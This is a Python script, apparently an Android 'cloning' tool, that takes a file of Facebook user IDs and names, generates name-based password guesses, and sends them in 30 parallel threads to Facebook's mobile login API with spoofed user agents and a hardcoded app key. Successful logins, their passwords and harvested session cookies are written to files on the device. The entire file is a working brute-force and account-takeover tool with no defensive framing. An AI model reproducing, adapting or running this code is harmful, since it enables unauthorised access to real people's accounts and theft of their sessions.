import os
import subprocess
import concurrent.futures
import hashlib

try:
    import requests,json,time,re,random,sys,uuid,string,subprocess,zlib,base64,hashlib
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    exit('ERROR')
try:os.mkdir('/sdcard/KLEIN-T')
except:pass
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 

def clear():
    os.system('clear')
    print(logo)
logo ="""
\033[1;37m***********************************************\033[1;37m
\x1b[1;92m Programme By Klein 2.0
\033[1;37m***********************************************\033[1;37m"""
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+').text.splitlines()
def agen():
    x = str(random.randint(11,999))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(11,99))
    xx = ''.join(str(random.randint(0, 9)) for _ in range(7))
    agent = '[FBAN/FB4A;FBAV/383.0.0.14.110;FBPN/com.facebook.orca;FBLC/en_US;FBBV/306611966;FBCR/Jio;FBMF/vivo;FBBD/vivo;FBDV/V2190A;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1360};FB_FW/1;FBRV/0;]'
    user_agentt = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})) ' + agent
    return user_agentt

def useragent():
    try:
        x = random.choice(models)
        brand,device,manufacturer,modelname,ram,formF,soc,gpu,screensize,screendensities,ABIs,asv,oev,installbase,upar,upcr = x.rsplit(',')
        details = f"{screensize} {screendensities} {ABIs}"
        parts = details.split(" ")
        resolution = parts[0]
        width, height = resolution.split("x")
        density = parts[1]
        abi = " ".join(parts[2:])
        densety = f"{{density={density},width={height},height={height}}}"
        jz_value = str(random.randint(111111,999999))
        android_version = str(random.randint(4,11))
        dot = str('.')
        fbav = str(random.randint(111,111))+dot+str(random.randint(111,999))+dot+str(random.randint(111,999))+dot+str(random.randint(111,999))
        locales = random.choice(["af_ZA", "am_ET", "ar_AE", "az_AZ", "be_BY", "bg_BG", "bn_BD", "bs_BA", "ca_ES", "cs_CZ", "da_DK", "de_DE", "el_GR", "en_AU", "en_CA", "en_GB", "en_US", "es_ES", "et_EE", "eu_ES", "fa_IR", "fi_FI", "fil_PH", "fr_CA", "fr_FR", "ga_IE", "gl_ES", "gu_IN", "he_IL", "hi_IN", "hr_HR"])
        fbbv = str(random.randint(111111111,999999999))
        fbrv = str(random.randint(1111111,9999999))
        buildo = ["UP1A", "RP1A", "TP1A", "UP2A", "RP2A", "TP2A", "UP3A", "RP3A", "TP3A", "UP4A", "RP4A", "TP4A", "UP5A", "RP5A", "TP5A", "UP6A", "RP6A", "TP6A", "UP7A", "RP7A", "TP7A", "UP8A", "RP8A", "TP8A", "UP9A", "RP9A", "TP9A", "UP10A", "RP10A", "TP10A"]
        build = str(random.choice(buildo))
        ua = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/{build}.{jz_value}.0{str(random.randint(11,99))}) [FBAN/Orca-Android;FBAV/{fbav};FBPN/com.facebook.orca;FBLC/{locales};FBBV/{fbbv};FBCR/null;FBMF/{manufacturer};FBBD/{brand};FBDV/{device};FBSV/{android_version};FBCA/{abi}:null;FBDM/{densety};FB_FW/1;FBRV/0;]"
        return ua
    except Exception as e:
        ua = ('Dalvik/2.1.0 (Linux; U; Android 11; Infinix X689B Build/RP1A.200720.011) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/en_US;FBBV/480086166;FBCR/null;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X689B;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};FB_FW/1;FBRV/0;]')
        return ua
def __line__():
    print(f'\033[1;37m***********************************************\033[1;37m')

loop=0
oks=[]
cps=[]
id = []
ck = []

def __menu__():
    clear()
    print('[1] File Cloning')
    __line__()
    x=input(' Choice : ')
    if x =='1':
        hedafile()
    else:print('\n Invalid choice please select correct option');time.sleep(1);__menu__()

def hedafile():
    clear()
    file = input('\033[1;37m[–] File Path :\033[1;32m ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print('\033[1;37m File location not found ');time.sleep(2);__menu__()
    __line__()
    print('[1] Method 1 ')
    __line__()
    mthd = input(' Choice : ')
    plist=[]
    clear()
    try:
        ps_limit = int(input('\033[1;37m[–] How Many Pasword You Want To Add :  '))
    except:
        ps_limit =1
    __line__()
    print('\033[1;37m[–] Example :\033[1;37mfirst last, firtslast, first123')
    __line__()
    for i in range(ps_limit):
        plist.append(input(f'\033[1;37m Password No.{i+1}: '))
    __line__()
    with tred(max_workers=30) as fuckers:
        clear()
        tl = str(len(fo))
        print('\033[1;37m[+] Total account : \033[1;32m'+tl)
        __line__()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if mthd =='1':
                fuckers.submit(_FILE_METHOD_1,ids,names,passlist)
            elif mthd =='2':
                fuckers.submit(_FILE_METHOD_2,ids,names,passlist)
            else:
                fuckers.submit(_FILE_METHOD_1,ids,names,passlist)
    print('\033[1;37m')
    __line__()
    print(' The process has completed')
    print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    __line__()
    exit('\033[1;32m Cracking Complete\033[1;37m')



#-------------------[METHODS]-------------------#
def _FILE_METHOD_1(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f'\r\r\033[1;37m[XAIVER-XD] {loop}|M1|\033[1;32m{len(oks)}\033[1;37m  ');sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            cgs = str(random.randint(11,299))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(11, 99))
            data = {
'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'generate_analytics_claim': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': '',
'credentials_type': 'password',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'source': 'login',
'generate_machine_id': '1',
'jazoest': ''.join(random.choice('0123456789') for _ in range(5)),
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
'api_key': '256002347743983',
'sig': '58f295d400d1e0e2627b40364bbb5219',
'access_token': '256002347743983|374e60f8b9bb6b8cbb30f78030438895'}
            head = {
'authorization': 'OAuth null',
'x-fb-connection-quality': 'GOOD',
'user-agent': useragent(),
'content-encoding': 'null',
'zero-rated': '0',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-connection-type': 'WIFI',
'x-tigon-is-retry': 'False',
'x-fb-friendly-name': 'authenticate',
'x-fb-request-analytics-tags': '{"network_tags":{"retry_attempt":"0"},"application_tags":"unknown"}',
'accept-encoding': 'null',
'x-fb-http-engine': 'Liger',
'x-fb-client-ip': 'True',
'x-fb-server-cluster': 'True'
            }
            data["sig"] = hashlib.md5(("".join([x+"="+data[x] for x in sorted(data) if x!="access_token"])+"374e60f8b9bb6b8cbb30f78030438895").encode()).hexdigest()
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                print('\r\r\x1b[38;5;46m[KLEIN-OK] '+ids+' | '+pas)
                oks.append(ids)
                open('/sdcard/KLEIN-T/T-OK.txt','a').write(ids+'|'+pas+'\n')
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                open('/sdcard/KLEIN-T/T-COKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                print('\r\r\x1b[38;5;208m[KLEIN-CP] '+ids+' | '+pas)
                open('/sdcard/KLEIN-T/CPS.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(1)
    except Exception as e:
        pass



if __name__ == "__main__":
    __menu__()
